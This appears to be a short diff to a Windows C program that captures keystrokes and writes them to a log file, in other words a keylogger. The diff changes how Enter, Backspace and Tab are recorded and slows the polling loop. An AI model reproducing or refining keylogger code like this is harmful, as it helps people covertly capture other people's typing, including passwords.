@@ -285,9 +285,9 @@ int main() {
                     strcpy(message, " ");
                 } else {
                     switch (i) {
-                        case VK_RETURN:  strcpy(message, " [Enter] "); break;
-                        case VK_BACK:    strcpy(message, " [Backspace] "); break;
-                        case VK_TAB:     strcpy(message, " [Tab] "); break;
+                        case VK_RETURN:  strcpy(message, " \\n "); break;
+                        case VK_BACK:    strcpy(message, " \\b "); break;
+                        case VK_TAB:     strcpy(message, " \\t "); break;
                         case VK_ESCAPE:  strcpy(message, " [Esc] "); break;
                         case VK_SHIFT:   strcpy(message, " [Shift] "); break;
                         case VK_CONTROL: strcpy(message, " [Ctrl] "); break;
@@ -307,7 +307,7 @@ int main() {
                 save_to(LOG_FILE, message);
             }
         }
-        Sleep(10); // Reduce CPU usage
+        Sleep(100); // Reduce CPU usage
     }
 
     return 0;
